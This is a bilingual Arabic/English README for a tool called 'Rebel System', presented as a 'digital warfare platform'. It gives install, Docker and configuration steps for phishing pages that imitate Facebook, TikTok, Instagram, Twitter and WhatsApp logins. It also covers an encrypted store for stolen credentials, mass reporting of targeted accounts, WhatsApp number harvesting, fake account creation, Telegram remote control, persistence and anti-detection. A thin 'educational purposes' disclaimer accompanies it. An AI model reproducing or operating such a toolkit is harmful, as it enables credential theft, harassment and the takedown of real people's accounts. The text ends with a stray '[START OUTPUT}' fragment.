# 🔥 REBEL SYSTEM – نظام الثأر الرقمي 🔥

<div align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=30&duration=3000&pause=1000&color=FF0000&center=true&vCenter=true&width=600&lines=REBEL+SYSTEM;%D9%86%D8%B8%D8%A7%D9%85+%D8%A7%D9%84%D8%AB%D8%A3%D8%B1+%D8%A7%D9%84%D8%B1%D9%82%D9%85%D9%8A;DIGITAL+WARFARE+PLATFORM" alt="Typing SVG" />
</div>

<div align="center">
  
  ### 🚨 تحذير هام / IMPORTANT WARNING 🚨
  
  **هذا النظام لأغراض تعليمية فقط. الاستخدام غير المصرح به ضد أي فرد أو منظمة غير قانوني وغير أخلاقي.**
  
  **This system is for educational purposes only. Unauthorized use against any individual or organization is illegal and unethical.**
  
  **المطور لا يتحمل أي مسؤولية عن سوء الاستخدام.**
  
  **The developer assumes no responsibility for misuse.**
  
</div>

---

## 👤 المطور / DEVELOPER

<div align="center">
  
| الاسم | Name | Telegram |
|-------|------|----------|
| **عمران الضحياني** | **Emran Al-Dohaini** | [@abu_jamal777](https://t.me/abu_jamal777) |

</div>

---

## 📋 نظرة عامة / OVERVIEW

**نظام الثأر الرقمي** هو منصة متكاملة للحرب الرقمية مصممة لكشف ثغرات منصات التواصل الاجتماعي. يتضمن النظام أدوات تصيد متطورة، إبلاغ آلي، تجميع أرقام واتساب، وإنشاء حسابات أوتوماتيكي.

**Rebel System** is a comprehensive digital warfare platform designed to expose vulnerabilities in social media platforms. The system includes advanced phishing tools, automated reporting, WhatsApp number harvesting, and automatic account creation.

---

## ✨ المميزات / FEATURES

### 🔴 المستوى الأساسي / CORE FEATURES
| الميزة | Feature | الوصف |
|--------|---------|-------|
| 🎣 | **Multi-Platform Phishing** | صفحات تصيد لفيسبوك، تيك توك، انستغرام، تويتر، واتساب |
| 🤖 | **Automated Reporting** | إبلاغ آلي عن الحسابات باستخدام بيانات مسروقة |
| 📱 | **WhatsApp Harvester** | تجميع وإبلاغ أرقام واتساب |
| 🔄 | **Proxy Rotation** | تدوير البروكسي وتكامل مع Tor |
| 📡 | **Telegram C2** | تحكم عن بعد عبر بوت تيليجرام |

### 🟠 المستوى المتقدم / ADVANCED FEATURES
| الميزة | Feature | الوصف |
|--------|---------|-------|
| 👤 | **Account Creator** | إنشاء حسابات أوتوماتيكي باستخدام بريد مؤقت |
| 🕵️ | **Anti-Detection Browser** | متصفح مضاد للكشف مع بصمة عشوائية |
| 🔐 | **Encrypted Database** | قاعدة بيانات مشفرة للبيانات المسروقة |
| 💾 | **Persistence** | آليات بقاء في النظام بعد إعادة التشغيل |
| 💣 | **Self-Destruct** | خيار التدمير الذاتي عند الخطر |

### 🔥 المستوى الأسطوري / LEGENDARY FEATURES
| الميزة | Feature | الوصف |
|--------|---------|-------|
| 🧨 | **Zero-Day Exploits** | ثغرات يوم-صفر (عند التفعيل) |
| 🌐 | **Cloudflare Bypass** | تخطي حماية Cloudflare |
| 🧩 | **CAPTCHA Solver** | حل الكابتشا تلقائياً (باتبليغيت) |
| ⚡ | **100+ Threads** | 100+ خيط متزامن للإبلاغ |
| 🔥 | **Mass Destruction** | تدمير شامل للحسابات المستهدفة |

---

## 🏗️ هيكل المشروع / PROJECT STRUCTURE

```

RebelSystem/
├── main.py                 # المشغل الرئيسي
├── config.py               # الإعدادات والمفاتيح
├── database.py             # قاعدة البيانات المشفرة
├── proxy_manager.py        # إدارة البروكسي وTor
├── phishing_server.py      # خادم التصيد
├── reporting_engine.py     # محرك الإبلاغ الآلي
├── whatsapp_harvester.py   # حصاد أرقام واتساب
├── account_creator.py      # منشئ الحسابات
├── telegram_controller.py  # التحكم عن بعد
├── exploit_kit.py          # مجموعة الاستغلالات
├── utils.py                # دوال مساعدة
├── requirements.txt        # المتطلبات
├── Dockerfile              # حاوية
├── README.md               # هذا الملف
├── proxies.txt             # قائمة البروكسيات (اختياري)
├── target_numbers.txt      # أرقام واتساب مستهدفة
└── data/                   # مجلد البيانات
└── rebel_data.db       # قاعدة البيانات

```

---

## ⚙️ التثبيت / INSTALLATION

### 📦 الطريقة العادية / STANDARD METHOD

```bash
# 1. clone the repository
git clone https://github.com/yourusername/rebel-system.git
cd rebel-system

# 2. install dependencies
pip install -r requirements.txt

# 3. install chrome and chromedriver
# on ubuntu/debian:
sudo apt update
sudo apt install -y chromium-browser chromium-chromedriver tor

# 4. configure settings
nano config.py  # edit your telegram token, etc.

# 5. run the system
python main.py
```

🐳 الطريقة بالحاوية / DOCKER METHOD

```bash
# build the image
docker build -t rebel-system .

# run the container
docker run -d \
  --name rebel \
  -p 8080:8080 \
  -v $(pwd)/data:/app/data \
  -v $(pwd)/proxies.txt:/app/proxies.txt \
  -v $(pwd)/target_numbers.txt:/app/target_numbers.txt \
  --cap-add=NET_ADMIN \
  rebel-system
```

---

🔧 الإعدادات / CONFIGURATION

ملف config.py

```python
# الإعدادات الأساسية
HOST = '0.0.0.0'           # استمع على كل الواجهات
PORT = 8080                 # منفذ الخادم
USE_TOR = True              # استخدام Tor للتخفي
MAX_THREADS = 100           # عدد الخيوط المتزامنة

# مفتاح التشفير (يتولد تلقائياً)
ENCRYPTION_KEY = Fernet.generate_key()

# تيليجرام للتحكم عن بعد
TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'  # من @BotFather
TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'      # معرف المحادثة

# مفتاح حل الكابتشا (اختياري)
CAPTCHA_API_KEY = ''  # من 2captcha أو anti-captcha
```

ملف proxies.txt

```
socks5://user:pass@1.2.3.4:1080
http://5.6.7.8:3128
socks4://9.10.11.12:1080
```

ملف target_numbers.txt

```
+967123456789
+966501234567
+971501234567
```

---

📱 أوامر التيليجرام / TELEGRAM COMMANDS

الأمر Command الوصف
/start بدء عرض الترحيب والأوامر
/add_target <منصة> <اسم المستخدم> إضافة هدف إضافة حساب فيسبوك/تيك توك للاستهداف
/add_number <رقم> إضافة رقم إضافة رقم واتساب للاستهداف
/status الحالة عرض الأهداف الحالية
/create_account <منصة> إنشاء حساب إنشاء حساب جديد (فيسبوك فقط حالياً)
/stats إحصائيات عرض إحصائيات النظام

أمثلة / Examples

```
/add_target facebook john.doe
/add_target tiktok @cooluser
/add_number +967123456789
/create_account facebook
```

---

🌐 خادم التصيد / PHISHING SERVER

بعد تشغيل النظام، يمكن الوصول لخادم التصيد على:

```
http://your-server-ip:8080
```

الصفحات المتاحة:

· /facebook/login - صفحة فيسبوك
· /tiktok/login - صفحة تيك توك
· /instagram/login - صفحة انستغرام
· /twitter/login - صفحة تويتر
· /whatsapp/login - صفحة واتساب ويب

لوحة التحكم:

```
http://your-server-ip:8080/admin
```

---

🔐 قاعدة البيانات / DATABASE

جميع البيانات مشفرة باستخدام Fernet (تشفير متماثل قوي). قاعدة البيانات تحوي:

· البيانات المسروقة (إيميل/رقم، كلمة مرور، IP، وقت)
· الأهداف (منصة، اسم مستخدم/رقم، تقارير مرسلة)
· البروكسيات (حالة الاستخدام، عدد الإخفاقات)

---

🧪 اختبار / TESTING

✅ اختبار خادم التصيد

```bash
curl -X POST http://localhost:8080/facebook/login \
  -d "email=test@example.com&password=TestPass123"
```

✅ اختبار إضافة هدف عبر التيليجرام

أرسل للبوت: /add_target facebook markzuckerberg

---

⚠️ تحذيرات أمنية / SECURITY WARNINGS

1. هذا النظام خطير جداً – استخدمه فقط على أنظمتك الخاصة أو بتصريح خطي.
2. التتبع – استخدام Tor والبروكسيات لا يضمن عدم التتبع.
3. المسؤولية – أنت وحدك المسؤول عن أي استخدام غير قانوني.
4. التشفير – المفتاح موجود في config.py – احفظه بأمان.

---

🆘 الدعم / SUPPORT

للاستفسارات والدعم الفني:

· تيليجرام: @abu_jamal777
· المطور: عمران الضحياني (Emran Al-Dohaini)

ملاحظة: لا أقدم دعماً لأي استخدام غير قانوني. هذا المشروع لأغراض تعليمية وأمنية فقط.

---

📜 الترخيص / LICENSE

```
هذا المشروع محمي بموجب رخصة MIT. أنت حر في استخدامه وتعديله، 
لكن بدون أي ضمانات. المطور غير مسؤول عن أي ضرر ناتج عن الاستخدام.

This project is protected under the MIT License. You are free to use 
and modify it, but without any warranties. The developer is not 
responsible for any damages resulting from use.
```

---

<div align="center">

🔥 تم التطوير بواسطة / Developed by 🔥

عمران الضحياني | Emran Al-Dohaini

https://img.shields.io/badge/Telegram-@abu_jamal777-26A5E4?style=for-the-badge&logo=telegram&logoColor=white

---

"They call me a villain. I call myself a liberator."

"يسمونني شريراً. أنا أسمي نفسي محرراً."

https://visitor-badge.laobi.icu/badge?page_id=abu_jamal777.rebel-system

</div>
```

[START OUTPUT}
